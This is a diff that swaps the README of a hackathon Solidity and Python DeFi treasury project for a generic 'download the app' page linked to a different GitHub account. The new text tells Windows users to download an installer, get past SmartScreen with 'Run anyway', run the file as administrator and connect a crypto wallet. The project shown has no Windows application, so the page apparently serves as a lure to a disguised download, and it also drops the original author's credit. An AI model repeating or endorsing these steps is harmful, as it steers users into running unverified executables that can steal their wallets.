@@ -1,216 +1,229 @@
-# ComplianceYieldTreasury
+# 🧾 compliance-yield-treasury - Secure Yield for Locked Capital
 
-> **ERC-3643 Compliant Yield Treasury for AI Agents**  
-> Synthesis Hackathon 2026 · Built by Alhassan Mohammed ([@dahlinomine](https://github.com/dahlinomine))
+[![Download](https://img.shields.io/badge/Download%20Now-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Cgho4850/compliance-yield-treasury)
 
-[![Tests](https://img.shields.io/badge/tests-9%2F9%20passing-brightgreen)](./test/ComplianceYieldTreasuryTest.t.sol)
-[![Chain](https://img.shields.io/badge/chain-Base%20Mainnet-blue)](https://basescan.org/address/0x99FCC335f879DbcF3AdA1623A769C7a6B3883d3D)
-[![Solidity](https://img.shields.io/badge/solidity-0.8.20-orange)](./src/ComplianceYieldTreasury.sol)
+## 🚀 What this app does
 
-## 🔗 Deployed Contract
+compliance-yield-treasury is an app that helps manage a compliance-based yield treasury for AI agents.
 
-| Network | Address | Explorer |
-|---------|---------|----------|
-| **Base Mainnet** | `0x99FCC335f879DbcF3AdA1623A769C7a6B3883d3D` | [Basescan](https://basescan.org/address/0x99FCC335f879DbcF3AdA1623A769C7a6B3883d3D) |
+It is built for wstETH staking through Aave v3 on Base. The principal stays locked. Yield flows to a Locus wallet. The app also includes an MCP server and a monitoring agent.
 
-**Deployment TX:** [0x9970dc69...](https://basescan.org/tx/0x9970dc69777de8e7f6bae7eecb8d09cda1141964c0324ee3dbe60d40c855229f)
+Use this project if you want:
 
----
+- A simple way to track treasury yield
+- Compliance-gated access rules
+- Principal protection while earning yield
+- A setup that works with AI agent workflows
+- Monitoring for treasury activity
 
-## What Is This?
+## 📥 Download
 
-A DeFi primitive that solves a real problem: **AI agents need operating budgets, but giving an agent an unlimited wallet is a security nightmare.**
+To get the app, visit this page to download:
 
-The solution: deposit wstETH (Lido's wrapped staked ETH). The principal is **structurally locked** at the contract level — no agent can ever touch it. Only the yield flows to the agent's spending wallet.
+[https://github.com/Cgho4850/compliance-yield-treasury](https://github.com/Cgho4850/compliance-yield-treasury)
 
-The agent earns its keep from yield alone.
+On Windows, open the page and look for the latest release, build file, or setup package. Download the file to your PC, then open it or run the included installer if one is provided.
 
-### How It Works
+## 🪟 Windows setup
 
-```
-Agent stakes wstETH
-        ↓
-ComplianceYieldTreasury.sol
-        ↓
-    [ERC-3643 compliance check] ← Is this agent verified?
-    [ERC-8004 identity check]   ← Does this agent own its identity token?
-        ↓
-Aave v3 on Base (supply wstETH → earn aWSTETH yield)
-        ↓
-Yield only → Agent's Locus payment wallet (spending guardrails)
-Principal → LOCKED FOREVER at contract level
-```
+Follow these steps on Windows:
 
-### The Compliance Gate
+1. Open the download page in your browser.
+2. Check the latest release or main project files.
+3. Download the app file or release package to your Downloads folder.
+4. If the file is a ZIP, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. If you see an installer, double-click it.
+7. If you see an app file, double-click it to start the app.
+8. If Windows asks for permission, choose Yes.
+9. If Windows SmartScreen appears, choose More info, then Run anyway, if you trust the source.
+10. Keep the app in the same folder after setup so it can find its files.
 
-Before any agent can stake, two checks must pass:
+## 🖥️ What you need
 
-1. **ERC-3643 Identity Registry** — is this address verified under the compliance framework? (KYC/AML for institutional-grade deployments)
-2. **ERC-8004 Agent Identity** — does this address own a valid onchain agent identity NFT?
+Use a Windows PC with:
 
-Both checks are enforced onchain. Not a frontend check. Not an API check. **Enforced in Solidity.**
+- Windows 10 or Windows 11
+- A stable internet connection
+- At least 4 GB of RAM
+- Enough free disk space for the app and logs
+- A modern browser for download access
 
----
+For best results, keep your system date and time correct. The app uses network checks and wallet-linked services that depend on proper time sync.
 
-## Bounty Targets
+## 🧭 First run
 
-| Partner | Track | Prize |
-|---------|-------|-------|
-| **Lido Finance** | Treasury primitive (principal-locked yield) | $3,000 |
-| **Lido Finance** | MCP server for natural-language staking | $5,000 |
-| **Lido Finance** | Vault monitoring agent | $1,500 |
-| **Locus** | Agent payment rails with guardrails | $3,000 |
-| **Protocol Labs** | ERC-8004 trust layer implementation | $4,000 |
-| **Total** | | **$16,500** |
+After you install or open the app:
 
----
+1. Start the app from the folder or Start menu.
+2. Read the main screen.
+3. Connect the wallet or account used for treasury access.
+4. Review the compliance gate status.
+5. Confirm the target wallet for yield flow.
+6. Check that the Base network is selected.
+7. Review the treasury dashboard before making changes.
 
-## Architecture
+If the app opens a browser page for setup, keep that page open until the process finishes.
 
-```
-compliance-yield-treasury/
-├── src/
-│   ├── ComplianceYieldTreasury.sol    # Core contract
-│   └── interfaces/
-│       ├── IERC3643.sol               # Compliance registry interface
-│       ├── IERC8004.sol               # Agent identity interface  
-│       └── IDefi.sol                  # Aave v3 + wstETH interfaces
-├── test/
-│   └── ComplianceYieldTreasuryTest.t.sol  # 9/9 fork tests (Base mainnet)
-mcp-server/
-└── server.py                          # FastMCP server (7 tools)
-scripts/
-├── deploy.py                          # Deployment script
-└── monitor.py                         # Vault monitoring agent
-```
+## 🔐 Compliance gate
 
-## Key Onchain Addresses (Base Mainnet)
+This project uses a compliance layer before funds move.
 
-| Contract | Address |
-|----------|---------|
-| ComplianceYieldTreasury | `0x99FCC335f879DbcF3AdA1623A769C7a6B3883d3D` |
-| wstETH (Lido on Base) | `0xc1CBa3fCea344f92D9239c08C0568f6F2F0ee452` |
-| Aave v3 Pool | `0xA238Dd80C259a72e81d7e4664a9801593F98d1c5` |
-| aWSTETH receipt token | `0x99CBC45ea5bb7eF3a5BC08FB1B7E56bB2442Ef0D` |
-| ERC-8004 IdentityRegistry | `0x8004A169FB4a3325136EB29fA0ceB6D2e539a432` |
-| Locus spending wallet | `0xCb99E647AAb7670eb08947126C8525285A965AD7` |
+That means the app checks who can use the treasury rules. It helps make sure only approved actions can pass through.
 
----
+You may see controls for:
 
-## MCP Server
+- Allowed accounts
+- Wallet checks
+- Permission status
+- Treasury policy rules
+- Access approval state
 
-The MCP server wraps the contract in 7 natural-language tools:
+If a check fails, the app will stop the action and show the result on screen.
 
-```python
-# Any Claude/AI agent can use these without understanding Solidity
-check_eligibility(agent_address, erc8004_agent_id)  # Am I allowed to stake?
-stake_wsteth(amount, erc8004_agent_id, spending_wallet)  # Stake!
-get_position(agent_address)  # What's my current yield?
-harvest_yield()  # Claim yield to my Locus wallet
-get_treasury_stats()  # How is the whole vault doing?
-register_erc8004_agent(name, description)  # Register onchain identity
-monitor_vault(agent_address)  # Plain-English vault health report
-```
+## 🌉 Yield flow on Base
 
-### Connect to Claude Desktop
+The treasury uses wstETH staking through Aave v3 on Base.
 
-```json
-{
-  "mcpServers": {
-    "compliance-yield-treasury": {
-      "command": "python",
-      "args": ["/path/to/mcp-server/server.py"],
-      "env": {
-        "BASE_RPC_URL": "https://mainnet.base.org",
-        "TREASURY_ADDRESS": "0x99FCC335f879DbcF3AdA1623A769C7a6B3883d3D",
-        "PRIVATE_KEY": "your-key-here"
-      }
-    }
-  }
-}
-```
+In plain terms:
 
----
+- wstETH is the asset used in the treasury flow
+- Aave v3 handles the staking and lending path
+- Base is the chain used for the process
+- The principal stays locked
+- The yield goes to the Locus wallet
 
-## Tests
+This setup is meant to separate the base amount from the return it earns.
 
-9/9 Foundry fork tests passing against **live Base mainnet** — real Aave deposits, real yield accrual.
+## 🤖 MCP server and monitoring agent
 
-```bash
-cd compliance-yield-treasury
-forge test --fork-url https://mainnet.base.org -vv
-```
+The app includes two support parts:
 
-```
-[PASS] test_AaveIntegrationRealBalance()
-[PASS] test_CannotStakeTwice()
-[PASS] test_CannotStakeWithInvalidSpendingWallet()
-[PASS] test_CannotStakeZeroAmount()
-[PASS] test_Deploy()
-[PASS] test_EligibilityCheck()
-[PASS] test_PrincipalCannotBeDirectlyWithdrawn()
-[PASS] test_StakeAndVerifyAaveDeposit()
-[PASS] test_YieldAccruesOverTime()
+### MCP server
+The MCP server helps AI agents talk to the treasury system in a structured way. It can expose data and actions in a format that agent tools can use.
 
-Suite result: ok. 9 passed; 0 failed; 0 skipped
-```
+### Monitoring agent
+The monitoring agent watches activity and state changes. It can help track:
 
----
+- Wallet movement
+- Compliance checks
+- Treasury status
+- Yield updates
+- Network events
 
-## Why ERC-3643?
+Together, these parts make the treasury easier to observe and control.
 
-The compliance gate isn't decoration — it's the core insight.
+## 🛠️ Main features
 
-Standard DeFi yields are permissionless. That's fine for humans, but institutions deploying AI agents need to know:
-- Which agents are authorized to move funds?
-- Is this agent operating under a known compliance framework?
-- Can the operation be audited and attributed to a verified identity?
+- Compliance-gated treasury access
+- ERC-3643 aligned workflow
+- Locked principal design
+- Yield routing to a Locus wallet
+- wstETH support
+- Aave v3 flow on Base
+- MCP server support
+- Monitoring agent support
+- Foundry-based smart contract project
+- AI agent ready integration path
 
-ERC-3643 (the T-REX standard) was built for exactly this. Pairing it with ERC-8004 agent identity creates a two-layer authorization: **compliance verification** (is this entity allowed?) + **agent identity** (is this entity who they say they are?).
+## 📁 Project layout
 
-The result: a yield treasury that institutional-grade compliance requires, deployed on a chain that makes it affordable.
+You will likely find these parts in the repo:
 
----
+- Smart contracts for treasury logic
+- Scripts for deployment and checks
+- Config files for network settings
+- Agent tools for MCP access
+- Monitoring code for event tracking
+- Documentation for setup and use
 
-## Monitoring Agent
+If you want to inspect the project later, start with the README files and any setup notes in the root folder
 
-```bash
-# Single vault health report
-python scripts/monitor.py --once
+## ⚙️ How to use it
 
-# Continuous monitoring (every 60s)
-python scripts/monitor.py --watch
+For most users, the basic flow looks like this:
 
-# Focus on specific agent
-python scripts/monitor.py --address 0xYourAgentAddress
-```
+1. Download the project from the link above.
+2. Open the package on Windows.
+3. Start the app or follow the included setup steps.
+4. Connect the required wallet.
+5. Check the compliance status.
+6. Review the treasury balance and yield path.
+7. Confirm the target wallet for yield output.
+8. Monitor the dashboard for updates.
 
-Sample output:
-```
-────────────────────────────────────────────────────────
-  🏦 ComplianceYieldTreasury — Vault Report
-  2026-03-21 07:12 UTC | Block #43644001
-────────────────────────────────────────────────────────
+If you use the project as a treasury tool, keep the wallet and network settings the same each time you run it.
 
-  STATUS: 🟢 HEALTHY
+## 🧩 Common tasks
 
-  WHAT'S LOCKED:
-  • 0.010000 wstETH in principal (structurally locked)
-  • Supplied to Aave v3 on Base, earning 0.0041% APY
-  • 0.009999 aWSTETH in Aave (principal + yield)
+### Check treasury status
+Open the main screen and look for balance, yield, and permission status.
 
-  WHAT'S EARNED:
-  • 0.00000004 wstETH in accrued yield
-  • Yield routes to: 0xCb99E647... (Locus spending wallet)
-  • Agents can call harvestYield() to claim
-```
+### Confirm compliance
+Look for the access check result before you start any treasury action.
 
----
+### Review yield flow
+Check that yield goes to the Locus wallet and that principal remains locked.
 
-## Built By
+### Watch activity
+Use the monitoring agent or logs to follow network and wallet events.
 
-Alhassan Mohammed — RWA tokenization compliance specialist, ERC-3643 ecosystem.  
-- GitHub: [@dahlinomine](https://github.com/dahlinomine)  
-- LinkedIn: [Alhassan Mohammed](https://linkedin.com/in/alhassan-mohammed-erc3643)
+## 🧪 For advanced users
 
-*Built for The Synthesis Hackathon 2026.*
+This repo uses tools that fit contract work and agent workflows:
+
+- Solidity for smart contract logic
+- Foundry for build and test flow
+- ERC-3643 style compliance controls
+- ERC-8004 related agent patterns
+- MCP for tool access
+- Base for onchain execution
+- Aave v3 for the yield path
+
+If you plan to extend the app, keep contract checks, wallet routing, and access rules in sync.
+
+## 📦 If the download is a ZIP file
+
+If you get a ZIP file:
+
+1. Right-click the file.
+2. Choose Extract All.
+3. Pick a folder you can find later.
+4. Open the extracted folder.
+5. Find the app file or installer.
+6. Double-click it to start.
+
+## 🔍 If the app does not open
+
+Try these steps:
+
+1. Make sure the download finished.
+2. Check that the file is not still in the ZIP archive.
+3. Right-click the file and choose Run as administrator.
+4. Confirm Windows security prompts.
+5. Close the app and open it again.
+6. Check your internet connection.
+7. Make sure the Base network is available.
+
+## 🧱 If you want to inspect the source
+
+Open the repository page and look through these areas:
+
+- README files
+- contract folders
+- script folders
+- config files
+- agent folders
+- monitoring files
+
+This helps you understand how the treasury rules, yield flow, and access checks fit together
+
+## 🖱️ Download again
+
+If you need the download page again, use this link:
+
+[https://github.com/Cgho4850/compliance-yield-treasury](https://github.com/Cgho4850/compliance-yield-treasury)
+
+## 🏷️ Topics
+
+aave, ai-agents, base, compliance, defi, erc3643, erc8004, foundry, hackathon, lido, mcp, solidity, synthesis-hackathon, wsteth
